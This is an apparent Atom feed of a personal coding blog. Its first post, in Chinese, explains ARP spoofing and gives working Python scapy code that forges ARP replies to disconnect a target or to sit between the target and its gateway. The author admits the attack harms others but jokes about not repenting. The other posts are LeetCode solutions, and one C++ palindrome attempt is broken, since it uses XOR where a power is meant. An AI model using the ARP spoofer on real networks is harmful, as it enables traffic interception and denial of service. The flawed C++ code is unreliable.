<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mistletoe</title>
  
  <subtitle>lovers kissing under mistletoe will be inseprable</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zoec.info/"/>
  <updated>2018-09-02T13:14:37.644Z</updated>
  <id>http://zoec.info/</id>
  
  <author>
    <name>Zoe C.</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ArpAttack</title>
    <link href="http://zoec.info/2018/09/02/ArpAttack/"/>
    <id>http://zoec.info/2018/09/02/ArpAttack/</id>
    <published>2018-09-02T12:42:27.000Z</published>
    <updated>2018-09-02T13:14:37.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Arp断网攻击"><a href="#Arp断网攻击" class="headerlink" title="Arp断网攻击"></a>Arp断网攻击</h1><p><a href="https://baike.baidu.com/item/arp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/2627803" target="_blank" rel="noopener"><em>ARP攻击</em></a>就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><a id="more"></a><hr><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a><a href="https://blog.csdn.net/qq_33936481/article/details/51286486" target="_blank" rel="noopener">理论基础</a></h2><p>ARP地址转换表（ARP缓存）是依赖于计算机中高速缓冲存储器动态更新的，而高速缓冲存储器的更新是受到更新周期的限制的，只保存最近使用的地址的映射关系表项，这使得攻击者有了可乘之机，可以在高速缓冲存储器更新表项之前修改地址转换表，实现攻击。ARP请求为广播形式发送的，网络上的主机可以自主发送ARP应答消息，并且当其他主机收到应答报文时不会检测该报文的真实性就将其记录在本地的MAC地址转换表，这样攻击者就可以向目标主机发送伪ARP应答报文，从而篡改本地的MAC地址表。这就是所谓的APR欺骗攻击。</p><p>第一步：假设主机A访问某网站，那么要告知某网站我的IP和MAC地址，但这是以广播的方式告知的。</p><p>第二步，由于是广播方式告知，猥琐的B主机也知道了A的IP和Mac地址，于是B主机把自己伪装成某网站，给A发送回复，A误以为B就是某网站，因此更新了自己本机的ARP缓存。</p><p>第三步，两者建立连接，A不断将自己的请求发给B。如果B转发A的请求给某网站，再转发给A，那相当于A的流量都从B经过，这就是步骤4，因此可以会话劫持；如果B给A的是一个假地址，那么A永远上不了网了。</p><h2 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h2><h3 id="使用非常简单的scapy包"><a href="#使用非常简单的scapy包" class="headerlink" title="使用非常简单的scapy包"></a>使用非常简单的scapy包</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span>(</span><br><span class="line">        Ether,</span><br><span class="line">        ARP,</span><br><span class="line">        sendp</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">eth=Ether()</span><br><span class="line">arp=ARP(</span><br><span class="line">        op=<span class="string">"is-at"</span>,</span><br><span class="line">        hwsrc=<span class="string">"本机mac"</span>,</span><br><span class="line">        psrc=<span class="string">"本机ip"</span>,</span><br><span class="line">        hwdst=<span class="string">"目标mac"</span>,</span><br><span class="line">        pdst=<span class="string">"目标ip"</span></span><br><span class="line">        )</span><br><span class="line">print((eth/arp).show())</span><br><span class="line">sendp(eth/arp,inter=<span class="number">2</span>,loop=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>非常不稳定</p><h3 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h3><h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h4><h5 id="获取mac地址"><a href="#获取mac地址" class="headerlink" title="获取mac地址"></a>获取mac地址</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(tgt_ip)</span>:</span> </span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">    调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。 </span></span><br><span class="line"><span class="string">    '''</span> </span><br><span class="line">    tgt_mac = getmacbyip(tgt_ip) </span><br><span class="line">    <span class="keyword">if</span> tgt_mac <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>: </span><br><span class="line">        <span class="keyword">return</span> tgt_mac </span><br><span class="line">    <span class="keyword">else</span>: print(<span class="string">"无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活"</span>%tgt_ip)</span><br></pre></td></tr></table></figure><h5 id="伪造网关"><a href="#伪造网关" class="headerlink" title="伪造网关"></a>伪造网关</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_arp_station</span><span class="params">(src_mac, tgt_mac, gateway_ip, tgt_ip)</span>:</span> </span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">    生成ARP数据包，伪造网关欺骗目标计算机 </span></span><br><span class="line"><span class="string">    src_mac:本机的MAC地址，充当中间人 </span></span><br><span class="line"><span class="string">    tgt_mac:目标计算机的MAC </span></span><br><span class="line"><span class="string">    gateway_ip:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击 </span></span><br><span class="line"><span class="string">    tgt_ip:目标计算机的IP </span></span><br><span class="line"><span class="string">    op=is-at,表示ARP响应 </span></span><br><span class="line"><span class="string">    '''</span> </span><br><span class="line">    eth = Ether(src=src_mac, dst=tgt_mac) </span><br><span class="line">    arp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=tgt_mac, pdst=tgt_ip, op=<span class="string">"is-at"</span>) </span><br><span class="line">    pkt = eth / arp </span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></figure><h5 id="伪造目标计算机"><a href="#伪造目标计算机" class="headerlink" title="伪造目标计算机"></a>伪造目标计算机</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_arp_gateway</span><span class="params">(src_mac, gateway_mac, tgt_ip, gateway_ip)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">    生成ARP数据包，伪造目标计算机欺骗网关 </span></span><br><span class="line"><span class="string">    src_mac:本机的MAC地址，充当中间人 </span></span><br><span class="line"><span class="string">    gateway_mac:网关的MAC </span></span><br><span class="line"><span class="string">    tgt_ip:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击 </span></span><br><span class="line"><span class="string">    gateway_ip:网关的IP </span></span><br><span class="line"><span class="string">    op=is-at,表示ARP响应 </span></span><br><span class="line"><span class="string">    '''</span> </span><br><span class="line">    eth = Ether(src=src_mac, dst=gateway_mac) </span><br><span class="line">    arp = ARP(hwsrc=src_mac, psrc=tgt_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="string">"is-at"</span>) </span><br><span class="line">    pkt = eth / arp </span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><p><a href="https://github.com/yakumozoe/arpattack" target="_blank" rel="noopener"><em>GitHub</em></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><em>Black Hat Python: Python Programming for Hackers and Pentesters</em><br><em>计算机网络</em></p><h2 id="最后再说一句"><a href="#最后再说一句" class="headerlink" title="最后再说一句"></a>最后再说一句</h2><p>Arp断网攻击时不好的行为，会对他人造成损失，以及被发现之后对自己也会造成创伤。</p><p>BTW，鱼酱明知道这是不好的行为但是死不悔改。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Arp断网攻击&quot;&gt;&lt;a href=&quot;#Arp断网攻击&quot; class=&quot;headerlink&quot; title=&quot;Arp断网攻击&quot;&gt;&lt;/a&gt;Arp断网攻击&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://baike.baidu.com/item/arp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/2627803&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;em&gt;ARP攻击&lt;/em&gt;&lt;/a&gt;就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="Bad Codes" scheme="http://zoec.info/tags/Bad-Codes/"/>
    
      <category term="Arp" scheme="http://zoec.info/tags/Arp/"/>
    
      <category term="Python" scheme="http://zoec.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Longest Common Prefix</title>
    <link href="http://zoec.info/2018/09/02/Longest-Common-Prefix/"/>
    <id>http://zoec.info/2018/09/02/Longest-Common-Prefix/</id>
    <published>2018-09-02T11:42:02.000Z</published>
    <updated>2018-09-02T11:57:07.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><p>Write a function to find the longest common prefix string amongst an array of strings.</p><a id="more"></a><hr><p>If there is no common prefix, return an empty string “”.</p><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>Input: [“flower”,”flow”,”flight”]<br>Output: “fl”</p><h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>Input: [“dog”,”racecar”,”car”]<br>Output: “”<br>Explanation: There is no common prefix among the input strings.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Intuition"><a href="#Intuition" class="headerlink" title="Intuition"></a><a href="https://leetcode.com/problems/longest-common-prefix/solution/" target="_blank" rel="noopener">Intuition</a></h2><p>For a start we will describe a simple way of finding the longest prefix shared by a set of strings LCP(S_1 \ldots S_n)LCP(S​1…S​n​​). We will use the observation that :</p><p>LCP(S_1 \ldots S_n) = LCP(LCP(LCP(S_1, S_2),S_3),\ldots S_n)LCP(S​1​​ …S​n​​ )=LC(LCP(LCP(S​1​​ ,S​2​​ ),S​3​​ ),…S​n )</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a><a href="https://leetcode.com/problems/longest-common-prefix/solution/" target="_blank" rel="noopener">Algorithm</a></h2><p>To employ this idea, the algorithm iterates through the strings [S_1\ldots S_n],[S​1​​ …S​n ], finding at each iteration ii the longest common prefix of strings LCP(S_1 \ldots S_i)LCP(S​1​​ …S​i​​ ) When LCP(S_1 \ldots S_i)LCP(S​1​​ …S​i​​ ) is an empty string, the algorithm ends. Otherwise after nn iterations, the algorithm returns LCP(S_1 \ldots S_n)LCP(S​1​​ …S​n​​ ).</p><h2 id="Part-of-Codes"><a href="#Part-of-Codes" class="headerlink" title="Part of Codes"></a>Part of Codes</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    String prefix = strs[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; strs.length; i++)</span><br><span class="line">        <span class="keyword">while</span> (strs[i].indexOf(prefix) != <span class="number">0</span>) &#123;</span><br><span class="line">            prefix = prefix.substring(<span class="number">0</span>, prefix.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (prefix.isEmpty()) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> prefix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Full Codes Can Get in <a href="https://github.com/yakumozoe/LeetCode/tree/master/Longest%20Common%20Prefix" target="_blank" rel="noopener"><em>GitHub</em></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Question&quot;&gt;&lt;a href=&quot;#Question&quot; class=&quot;headerlink&quot; title=&quot;Question&quot;&gt;&lt;/a&gt;Question&lt;/h1&gt;&lt;p&gt;Write a function to find the longest common prefix string amongst an array of strings.&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="LeetCode" scheme="http://zoec.info/tags/LeetCode/"/>
    
      <category term="Algorithms" scheme="http://zoec.info/tags/Algorithms/"/>
    
      <category term="Java" scheme="http://zoec.info/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Roman to Integer</title>
    <link href="http://zoec.info/2018/09/01/Roman-to-Integer/"/>
    <id>http://zoec.info/2018/09/01/Roman-to-Integer/</id>
    <published>2018-09-01T11:45:25.000Z</published>
    <updated>2018-09-01T12:09:23.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><p>Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.</p><a id="more"></a><hr><table><thead><tr><th style="text-align:center">Symbol</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">I</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">V</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">X</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">L</td><td style="text-align:center">50</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">D</td><td style="text-align:center">500</td></tr><tr><td style="text-align:center">M</td><td style="text-align:center">1000</td></tr></tbody></table><p>For example, two is written as II in Roman numeral, just two one’s added together. Twelve is written as, XII, which is simply X + II. The number twenty seven is written as XXVII, which is XX + V + II.</p><p>Roman numerals are usually written largest to smallest from left to right. However,the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:</p><p>I can be placed before V (5) and X (10) to make 4 and 9.<br>X can be placed before L (50) and C (100) to make 40 and 90.<br>C can be placed before D (500) and M (1000) to make 400 and 900.<br>Given a roman numeral, convert it to an integer. Input is guaranteed to be within the range from 1 to 3999.</p><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>Input: “III”<br>Output: 3</p><h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>Input: “IV”<br>Output: 4</p><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>Input: “IX”<br>Output: 9</p><h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h2><p>Input: “LVIII”<br>Output: 58<br>Explanation: C = 100, L = 50, XXX = 30 and III = 3.</p><h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h2><p>Input: “MCMXCIV”<br>Output: 1994<br>Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">    map.put(<span class="string">'I'</span>, <span class="number">1</span>);</span><br><span class="line">    map.put(<span class="string">'V'</span>, <span class="number">5</span>);</span><br><span class="line">    map.put(<span class="string">'X'</span>, <span class="number">10</span>);</span><br><span class="line">    map.put(<span class="string">'L'</span>, <span class="number">50</span>);</span><br><span class="line">    map.put(<span class="string">'C'</span>, <span class="number">100</span>);</span><br><span class="line">    map.put(<span class="string">'D'</span>, <span class="number">500</span>);</span><br><span class="line">    map.put(<span class="string">'M'</span>, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">int</span> len = s.length(), result = map.get(s.charAt(len - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.get(s.charAt(i)) &gt;= map.get(s.charAt(i + <span class="number">1</span>)))</span><br><span class="line">            result += map.get(s.charAt(i));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            result -= map.get(s.charAt(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>Full Codes Can Get in <a href="https://github.com/yakumozoe/LeetCode/tree/master/Roman%20to%20%20Integer" target="_blank" rel="noopener">GitHub</a></em></p><h1 id="BTW"><a href="#BTW" class="headerlink" title="BTW"></a>BTW</h1><p>校园网真的慢</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Question&quot;&gt;&lt;a href=&quot;#Question&quot; class=&quot;headerlink&quot; title=&quot;Question&quot;&gt;&lt;/a&gt;Question&lt;/h1&gt;&lt;p&gt;Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="LeetCode" scheme="http://zoec.info/tags/LeetCode/"/>
    
      <category term="Algorithms" scheme="http://zoec.info/tags/Algorithms/"/>
    
      <category term="Java" scheme="http://zoec.info/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Palindrome Number</title>
    <link href="http://zoec.info/2018/09/01/Palindrome-Number/"/>
    <id>http://zoec.info/2018/09/01/Palindrome-Number/</id>
    <published>2018-08-31T18:38:45.000Z</published>
    <updated>2018-08-31T18:51:58.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><p>Determine whether an integer is a palindrome. An integer is a palindrome when it reads the same backward as forward.</p><a id="more"></a><hr><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>Input: 121<br>Output: true</p><h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>Input: -121<br>Output: false</p><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><p>From left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome.</p><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>Input: 10<br>Output: false</p><h3 id="Explanation-1"><a href="#Explanation-1" class="headerlink" title="Explanation"></a>Explanation</h3><p>Reads 01 from right to left. Therefore it is not a palindrome.</p><h2 id="Follow-up"><a href="#Follow-up" class="headerlink" title="Follow up"></a>Follow up</h2><p>Coud you solve it without converting the integer to a string?</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Intuition"><a href="#Intuition" class="headerlink" title="Intuition"></a><a href="https://leetcode.com/problems/palindrome-number/solution/" target="_blank" rel="noopener">Intuition</a></h2><p>The first idea that comes to mind is to convert the number into string, and check if the string is a palindrome, but this would require extra non-constant space for creating the string which is not allowed by the problem description.</p><p>Second idea would be reverting the number itself, and then compare the number with original number, if they are the same, then the number is a palindrome. However, if the reversed number is larger than \text{int.MAX}int.MAX, we will hit integer overflow problem.</p><p>Following the thoughts based on the second idea, to avoid the overflow issue of the reverted number, what if we only revert half of the \text{int}int number? After all, the reverse of the last half of the palindrome should be the same as the first half of the number, if the number is a palindrome.</p><p>For example, if the input is 1221, if we can revert the last part of the number “1221” from “21” to “12”, and compare it with the first half of the number “12”, since 12 is the same as 12, we know that the number is a palindrome.</p><p>Let’s see how we could translate this idea into an algorithm.</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a><a href="https://leetcode.com/problems/palindrome-number/solution/" target="_blank" rel="noopener">Algorithm</a></h2><p>First of all we should take care of some edge cases. All negative numbers are not palindrome, for example: -123 is not a palindrome since the ‘-‘ does not equal to ‘3’. So we can return false for all negative numbers.</p><p>Now let’s think about how to revert the last half of the number. For number 1221, if we do 1221 % 10, we get the last digit 1, to get the second to the last digit, we need to remove the last digit from 1221, we could do so by dividing it by 10, 1221 / 10 = 122. Then we can get the last digit again by doing a modulus by 10, 122 % 10 = 2, and if we multiply the last digit by 10 and add the second last digit, 1 * 10 + 2 = 12, it gives us the reverted number we want. Continuing this process would give us the reverted number with more digits.</p><p>Now the question is, how do we know that we’ve reached the half of the number?</p><p>Since we divided the number by 10, and multiplied the reversed number by 10, when the original number is less than the reversed number, it means we’ve processed half of the number digits.</p><h2 id="Part-of-My-Code-C"><a href="#Part-of-My-Code-C" class="headerlink" title="Part of My Code(C++)"></a>Part of My Code(C++)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum1,sum2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">front</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> z=y/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x/(<span class="number">10</span>^(y-z))&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> x/(<span class="number">10</span>^(y-z));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">back</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> y=x%<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span> (; x/=<span class="number">10</span>; )&#123;</span><br><span class="line">            y = y*<span class="number">10</span> + x%<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;y/(<span class="number">10</span>^(m-m/<span class="number">2</span>))&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> y/(<span class="number">10</span>^(m-m/<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>||(x%<span class="number">10</span>==<span class="number">0</span>&amp;&amp;x!=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(x&lt;<span class="number">10</span>&amp;&amp;x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> xbackup=x;</span><br><span class="line">            <span class="keyword">static</span> <span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                x=x/<span class="number">10</span>;</span><br><span class="line">                i++;</span><br><span class="line">                a=i+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">while</span>(x&gt;<span class="number">10</span>);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;xbackup&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">int</span> b=a;</span><br><span class="line">            sum1=front(xbackup,a);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;sum1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            sum2=back(xbackup,b);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;sum2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">if</span>(sum1==sum2)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Full-Codes"><a href="#Full-Codes" class="headerlink" title="Full Codes"></a>Full Codes</h2><p><a href="https://github.com/yakumozoe/LeetCode/tree/master/Palindrome%20Number" target="_blank" rel="noopener"><strong>GITHUB</strong></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Question&quot;&gt;&lt;a href=&quot;#Question&quot; class=&quot;headerlink&quot; title=&quot;Question&quot;&gt;&lt;/a&gt;Question&lt;/h1&gt;&lt;p&gt;Determine whether an integer is a palindrome. An integer is a palindrome when it reads the same backward as forward.&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="LeetCode" scheme="http://zoec.info/tags/LeetCode/"/>
    
      <category term="Algorithms" scheme="http://zoec.info/tags/Algorithms/"/>
    
      <category term="C++" scheme="http://zoec.info/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Integer</title>
    <link href="http://zoec.info/2018/08/31/Reverse-Integer/"/>
    <id>http://zoec.info/2018/08/31/Reverse-Integer/</id>
    <published>2018-08-31T11:31:44.000Z</published>
    <updated>2018-08-31T18:43:48.774Z</updated>
    
